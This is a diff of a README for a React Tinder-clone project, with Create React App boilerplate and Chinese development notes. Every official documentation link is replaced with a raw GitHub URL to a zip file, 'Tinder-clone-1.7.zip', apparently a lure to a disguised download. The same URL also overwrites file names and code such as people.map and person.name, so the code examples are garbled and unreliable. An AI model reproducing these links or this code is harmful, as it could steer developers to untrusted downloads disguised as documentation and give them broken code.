@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,43 +41,43 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 ### Deployment
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+This section has moved here: [https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip](https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip)
 
 
 在開始建置tinder-clone，選擇免費的firebase做成後端的建置(放置人物的資料和照片）。
 我選擇用Create-React-App來做這次的app，因為它已經幫我們寫好很多事情了。
 
-在index.css先讓margin:0，來避免掉一開始內建會給的margin（設計網頁會比較輕鬆）
+在https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip先讓margin:0，來避免掉一開始內建會給的margin（設計網頁會比較輕鬆）
 
-在App.js，架構會分成Header,TinderCards,Buttons, ChatScreen, Individual ChatScreen。
+在https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip，架構會分成Header,TinderCards,Buttons, ChatScreen, Individual ChatScreen。
 
-首先先來寫Header.js。為了要有tinder的圖案，我們需要先到material－UI（要注意版本）。
+首先先來寫https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip。為了要有tinder的圖案，我們需要先到material－UI（要注意版本）。
 在寫這邊時，我有用emotion寫，比較相容。
 在寫這邊的CSS，我先用display:flex，這樣圖案才會乖乖排成一列。接著用justify-content:space-between，讓內容可以在中間，而兩個圖案可以卡在最外邊兩側。最後，
 我用border-bottom:1px solid加顏色，在圖案下方畫一個淺淺的分割線。
@@ -87,7 +87,7 @@ font-size:large讓他變大一點點。
 header的css再加align-items:center，可以讓圖案全部水平對齊。
 為了讓按鍵在按的時候有按下去的感覺，我從material-ui import IconButton，並讓他夾著我原本的按鍵。
 
-上述完成後，可以開始串接App.js和Home.js了。
+上述完成後，可以開始串接https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip和https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip了。
 首先要先用import{BrowseRouter as Router,Routes,Route} from "react-router-dom"
 組成由外到內分別為Router,Routes,Route。Route會包裹著path和element（像<Route path element{}/>)。element裡頭，是拿來塞進去我們熟悉的HTML等東東，path則是理所當然的連結。
 我的Header是包在每個element裡。（或許有更好的做法也不一定）
@@ -95,11 +95,11 @@ header的css再加align-items:center，可以讓圖案全部水平對齊。
 我們接著灌進新的程式 react-tinder-card，用rfce，這個快捷鍵可以讓我產生一個preset增加工作效率。
 react-tinder-card是一個寫好的套件，他可以讓我們的卡片有像tinder滑左滑右的樣子。
 我們再來要做一個人物的矩陣，用const[people, setPeople]=usestate([])
-setPeople([...people,'Mark','Kevin']) 等同於 const people = [] people.push('Mark','Kevin')
+setPeople([https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip,'Mark','Kevin']) 等同於 const people = [] https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip('Mark','Kevin')
 當你資料更新時，React會自動用新資料展示新陣列。那個...是指前面在陣列的東西會保留下來。假設你沒有打...，等於你的陣列會只剩下Mark和Kevin。
-{people.map((person)=>(
+{https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip((person)=>(
 <TinderCard
-  key={person.name}
+  key={https://raw.githubusercontent.com/Bangyoupapa/Tinder-clone/main/src/Tinder-clone-1.7.zip}
   preventSwipe={["up","down"]}
   > </TinderCard>))}
 > 
